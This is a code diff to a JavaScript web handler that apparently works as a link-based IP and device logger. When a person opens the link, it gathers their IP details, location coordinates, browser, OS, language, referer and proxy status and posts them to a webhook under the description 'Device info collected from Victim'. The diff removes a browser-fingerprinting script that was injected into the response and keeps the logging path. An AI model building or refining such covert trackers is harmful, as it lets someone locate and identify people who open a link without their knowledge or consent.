@@ -86,29 +86,6 @@ function detectDeviceType(userAgent) {
 
 
 
-function injectFingerprintScript(res) {
-    const fingerprintScript = `
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
-        <script>
-            new Fingerprint2().get(function(result, components) {
-                fetch("/fingerprint", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ fingerprint: result, components: components })
-                }).then(() => {
-                    console.log("Browser fingerprint sent to server.");
-                }).catch((err) => {
-                    console.error("Failed to send browser fingerprint:", err);
-                });
-            });
-        </script>
-    `;
-    res.writeHead(200, { "Content-Type": "text/html" });
-    res.end(fingerprintScript);
-}
-
-let fingerprintStore = {}; // Temporary in-memory store to hold fingerprints
-
 
 
 function getBrowserEngine(userAgent) {
@@ -135,7 +112,7 @@ function logDebugInfo(reverseDNS, requestMetadata) {
 }
 
 
-function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata, fingerprint) {
+function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
     const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
 
     return [
@@ -166,8 +143,7 @@ function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browse
         { name: "Referer", value: safeValue(referer, "No referer"), inline: false },
         { name: "Network Type", value: safeValue(ipDetails.mobile ? "Mobile" : "Broadband"), inline: true },
         { name: "Using Proxy/VPN", value: safeValue(ipDetails.proxy ? "Yes" : "No"), inline: true },
-        { name: "Hosting", value: "`No`", inline: true },
-        { name: "Fingerprint", value: safeValue(fingerprint, "Not collected"), inline: false }
+        { name: "Hosting", value: "`No`", inline: true }
     ];
 }
 
@@ -343,44 +319,39 @@ export default async function handler(req, res) {
 
             try {
 
-                // In the handler function, add this for browser requests:
-                if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
-                    const fingerprint = await injectFingerprintScript(res);
-                    const fields = createCommonFields(
-                        ipDetails,
-                        coords,
-                        userAgent,
-                        deviceType,
-                        os,
-                        browserEngine,
-                        acceptLanguage,
-                        acceptEncoding,
-                        doNotTrack,
-                        referer,
-                        reverseDNS,
-                        requestMetadata,
-                        fingerprint
-                    );
+                const fields = createCommonFields(
+                    ipDetails,
+                    coords,
+                    userAgent,
+                    deviceType,
+                    os,
+                    browserEngine,
+                    acceptLanguage,
+                    acceptEncoding,
+                    doNotTrack,
+                    referer,
+                    reverseDNS,
+                    requestMetadata
+                );
 
-                    console.log("Fields for webhook message created successfully:", fields);
+                console.log("Fields for webhook message created successfully:", fields);
 
-                    const message = {
-                        embeds: [
-                            {
-                                title: "User Opened Link",
-                                color: 0x00FFFF,
-                                description: "Device info collected from Victim.",
-                                fields: fields
-                            }
-                        ]
-                    };
+                const message = {
+                    embeds: [
+                        {
+                            title: "User Opened Link",
+                            color: 0x00FFFF,
+                            description: "Device info collected from Victim.",
+                            fields: fields
+                        }
+                    ]
+                };
 
-                    console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
+                console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
 
-                    await sendToWebhook(message);
+                await sendToWebhook(message);
 
-                    console.log("Default webhook message sent successfully.");
-                }
+                console.log("Default webhook message sent successfully.");
 
             } catch (error) {
                 console.error("An error occurred while sending the default webhook message:", error);
